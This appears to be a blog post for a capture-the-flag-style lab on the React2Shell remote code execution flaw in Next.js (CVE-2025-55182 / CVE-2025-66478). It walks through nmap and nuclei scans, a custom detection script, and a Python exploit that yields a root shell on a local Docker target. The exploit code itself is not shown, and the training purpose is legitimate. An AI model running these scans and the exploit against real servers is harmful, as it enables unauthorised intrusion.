---
title: "React2Shell Lab"
date: 2025-12-31T18:24:41-08:00
draft: false
description: "React2Shell (CVE-2025-55182 / CVE-2025-66478) vulnerability lab - Learn to detect and exploit vulnerable Next.js applications"
noindex: false
featured: false
pinned: false
# comments: false
series:
  - labs
categories:
  - vulnerability scanning
  - rce
tags:
  - nuclei
  - nmap
  - react2shell
images: [react2shell.webp]
#  - 
# menu:
#   main:
#     weight: 100
#     params:
#       icon:
#         vendor: bs
#         name: book
#         color: '#e24d0e'
---

## Introduction

| Repo |⭐ Please give a [Star](http://www.github.com/rootandbeer/react2shell) if you enjoyed this lab ⭐ |
| --- | --- |
| Downloads | [![GitHub Clones](https://img.shields.io/badge/dynamic/json?color=success&label=Clone&query=count&url=https://gist.githubusercontent.com/rootandbeer/661c0dbe7346464f58e99c7b334e0307/raw/clone.json&logo=github)](https://github.com/MShawon/github-clone-count-badge) |
| Stars | [![GitHub stars](https://badgen.net/github/stars/rootandbeer/react2shell)](https://GitHub.com/rootandbeer/react2shell/stargazers/)
| Prerequisites | [Docker](https://docs.docker.com/engine/install/), [Nuclei](https://docs.projectdiscovery.io/opensource/nuclei/install) |
| Difficulty | ![Static Badge](https://img.shields.io/badge/easy-green) |

This lab features an intentionally vulnerable Next.js application demonstrating the `React2Shell` vulnerability (`CVE-2025-55182` / `CVE-2025-66478`). You will learn to identify vulnerable `Next.js` applications using port scanning and vulnerability detection tools, then exploit the vulnerability to gain remote command execution on the target system.

---

## Setup

Clone the repository:

```shell
git clone http://www.github.com/rootandbeer/react2shell
cd react2shell
```

\
Start the vulnerable application:

```shell
docker compose -f vulnerable-app/docker-compose.yml up --build -d
```

The vulnerable web application will be available at `172.16.238.129:3000`

---

## Scanning

### Port Scan

Run an `Nmap` scan to discover open ports:

```shell
nmap -A -p- 172.16.238.129
```

\
The output reveals `Next.js` running on port 3000:

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-31 20:38 PST
Nmap scan report for 172.16.238.129
Host is up (0.00011s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "32g3xwu6pd4me"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5990
|     Date: Thu, 01 Jan 2026 04:38:59 GMT
|     Connection: close
```

### Nuclei Vulnerability Scan

Update `Nuclei` templates:

```shell
nuclei -update-templates
```

\
Scan for the specific `React2Shell` CVE:

```shell
nuclei -u http://172.16.238.129:3000 -id cve-2025-55182
```

\
Or run a full vulnerability scan:

```shell
nuclei -u http://172.16.238.129:3000
```

### `React2Scan` Vulnerability Scan

Alternatively, use the custom `React2Scan` tool included in the repository. View the available options:

```shell
$ ./react2scan.sh
[*] React2Shell Detection Probe (CVE‑2025‑55182 / CVE‑2025‑66478)
[*] https://www.rootandbeer.com

[*] Default Port: 8443

Usage:
  ./react2scan.sh host
  ./react2scan.sh 192.168.1.0/24
  ./react2scan.sh ips.txt
  Optional: -p <port>
  ```

\
Scan the target host:

```shell
./react2scan.sh 172.16.238.129 -p 3000
```

\
Successful detection confirms the vulnerability:

```shell
$ ./react2scan.sh 172.16.238.129 -p 3000
[*] React2Shell Detection Probe (CVE‑2025‑55182 / CVE‑2025‑66478)
[*] https://www.rootandbeer.com

[*] Default Port: 8443

[*] Scanning single host
[*] Target: http://172.16.238.129:3000
[!] VULNERABLE
```

---

## Exploitation

The repository includes a Python exploit script for remote command execution. There are two modes of operation:

### Interactive Shell

Launch an interactive shell on the target:

```shell
python3 react2shell_exploit.py http://172.16.238.129:3000
```

\
Example output:

```shell
$ python3 ./react2shell_exploit.py http://172.16.238.129:3000
[*] React2Shell RCE Exploit
[*] CVE-2025-55182 / CVE-2025-66478
[*] https://www.rootandbeer.com

[*] React2Shell Interactive Shell
[*] Target: http://172.16.238.129:3000
[*] Type 'exit' or 'quit' to close the shell

[*] Testing connection...
[+] Connection successful!

react2shell> whoami
root

react2shell>
```

### Single Command Execution

Execute a single command and exit:

```shell
python3 react2shell_exploit.py http://172.16.238.129:3000 -c "whoami"
```

\
Example output:

```shell
$ python3 react2shell_exploit.py http://172.16.238.129:3000 -c "whoami"
[*] React2Shell RCE Exploit
[*] CVE-2025-55182 / CVE-2025-66478
[*] https://www.rootandbeer.com

root
```

\
⭐ Please give a [Star](http://www.github.com/rootandbeer/react2shell) if you enjoyed this lab ⭐ 